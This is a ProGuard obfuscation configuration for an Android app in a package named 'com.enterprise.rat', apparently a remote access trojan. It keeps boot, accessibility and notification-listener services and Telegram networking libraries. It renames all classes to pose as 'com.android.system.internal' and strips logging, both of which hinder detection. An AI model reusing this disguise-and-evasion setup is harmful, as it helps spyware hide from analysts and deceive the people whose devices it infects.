-repackageclasses 'com.android.system.internal'
-allowaccessmodification
-overloadaggressively

-keep class com.enterprise.rat.BootReceiver { *; }
-keep class com.enterprise.rat.services.AccessibilityService { *; }
-keep class com.enterprise.rat.services.NotificationListenerService { *; }
-keep class org.telegram.** { *; }
-keep class com.google.gson.** { *; }
-keep class okhttp3.** { *; }
-keep class okio.** { *; }

-keepattributes SourceFile,LineNumberTable
-keep class com.fasterxml.jackson.** { *; }

-dontwarn okhttp3.**
-dontwarn okio.**
-dontwarn javax.annotation.**
-dontwarn org.conscrypt.**
-dontwarn org.bouncycastle.**

-keepnames class com.fasterxml.jackson.** { *; }
-keepclassmembers class * {
    @com.google.gson.annotations.SerializedName <fields>;
}

-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
